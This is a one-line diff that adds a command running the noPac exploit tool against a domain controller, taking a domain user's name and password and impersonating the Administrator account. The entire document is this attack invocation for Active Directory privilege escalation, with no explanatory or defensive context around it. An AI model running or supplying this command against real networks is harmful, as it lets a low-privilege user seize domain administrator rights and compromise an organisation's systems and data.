@@ -1,0 +1,1 @@
+noPac.py "$DOMAIN"/"$USER":"$PASS" -dc-ip "$DC_IP" --impersonate "Administrator"
